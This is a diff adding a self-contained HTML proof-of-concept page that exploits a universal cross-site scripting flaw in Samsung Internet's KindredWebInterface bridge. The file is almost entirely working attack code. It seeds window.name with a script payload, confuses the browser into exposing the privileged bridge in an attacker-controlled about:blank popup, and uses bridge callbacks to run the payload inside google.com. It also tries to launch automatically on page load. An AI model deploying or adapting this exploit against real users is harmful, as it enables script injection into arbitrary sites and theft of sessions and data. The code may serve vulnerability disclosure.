@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Samsung Internet 30.0.5.24 Kindred UXSS PoC</title>
+  <style>
+    body { max-width: 760px; margin: 40px auto; padding: 0 20px; font: 16px/1.5 system-ui, sans-serif; }
+    button { padding: 12px 18px; font: inherit; font-weight: 650; }
+    pre { min-height: 12em; padding: 14px; overflow-wrap: anywhere; white-space: pre-wrap; background: #f3f4f6; }
+    .note { color: #555; }
+  </style>
+</head>
+<body>
+  <main id="main">
+    <h1>Samsung Internet Kindred UXSS PoC</h1>
+    <button id="run" type="button">Run one-click PoC</button>
+    <pre id="log" aria-live="polite"></pre>
+  </main>
+
+  <script>
+  (() => {
+    'use strict';
+
+    const params = new URLSearchParams(location.search);
+    if (params.has('bootstrap')) {
+      document.querySelector('#main').innerHTML =
+        '<h1>Attacker bootstrap document</h1><p>Waiting for the parent controller.</p>';
+      return;
+    }
+
+    const output = document.querySelector('#log');
+    const button = document.querySelector('#run');
+    let running = false;
+
+    function log(message) {
+      const stamp = new Date().toISOString().slice(11, 23);
+      output.textContent += `[${stamp}] ${message}\n`;
+    }
+
+    function bootstrapUrl() {
+      const url = new URL(location.href);
+      url.searchParams.set('bootstrap', String(Date.now()));
+      url.hash = 'attacker-bootstrap';
+      return url.href;
+    }
+
+    function run(mode) {
+      if (running) return;
+
+      const popup = open(bootstrapUrl(), '_blank');
+      if (!popup) {
+        log(`${mode}: popup blocked; click the button for the reliable path`);
+        return;
+      }
+
+      running = true;
+      button.disabled = true;
+      log(`${mode}: popup opened`);
+
+      
+      popup.name = '<scr' + 'ipt>alert(document.domain);document.write("<h1>PWNED BY BADCAT</h1>");</scr' + 'ipt>';
+      log('seeded window.name with domain-proof payload');
+
+      setTimeout(() => {
+        try {
+          popup.location.replace('about:blank#kindred-probe://amazon.com/');
+          log('navigated popup to parser-confused inherited about:blank');
+        } catch (error) {
+          log(`about:blank navigation failed: ${error}`);
+        }
+      }, 750);
+
+
+      setTimeout(() => {
+        try {
+          popup.location.reload();
+          log('reloaded crafted about:blank to materialize KindredWebInterface');
+        } catch (error) {
+          log(`reload failed: ${error}`);
+        }
+      }, 2000);
+
+      const started = performance.now();
+      const poll = setInterval(() => {
+        if (performance.now() - started > 20000) {
+          clearInterval(poll);
+          running = false;
+          button.disabled = false;
+          log('timed out waiting for KindredWebInterface');
+          return;
+        }
+
+        try {
+          if (typeof popup.KindredWebInterface === 'undefined') return;
+          clearInterval(poll);
+          log('KindredWebInterface acquired in attacker-origin document');
+
+          const guardProof = popup.KindredWebInterface.isCheckoutPage('amazon.com');
+          log(`guarded bridge method executed; result=${guardProof}`);
+
+          
+          for (let i = 0; i < 10; i++) {
+            popup.KindredWebInterface.findCouponsAndTemplates(
+              `uxss-delay-${Date.now()}-${i}.amazon.com`,
+              '',
+              'console.log',
+              1
+            );
+          }
+
+          popup.KindredWebInterface.findCouponsAndTemplates(
+            'amazon.com',
+            '',
+            'window.name.toString',
+            1
+          );
+          log('queued final window.name.toString callback');
+
+          popup.location.replace('https://www.google.com/');
+          log('navigated popup to unmodified https://www.google.com/');
+        } catch (error) {
+          clearInterval(poll);
+          running = false;
+          button.disabled = false;
+          log(`exploit setup failed: ${error}`);
+        }
+      }, 100);
+    }
+
+    button.addEventListener('click', () => run('one-click'));
+
+
+    setTimeout(() => run('no-click attempt'), 0);
+  })();
+  </script>
+</body>
+</html>
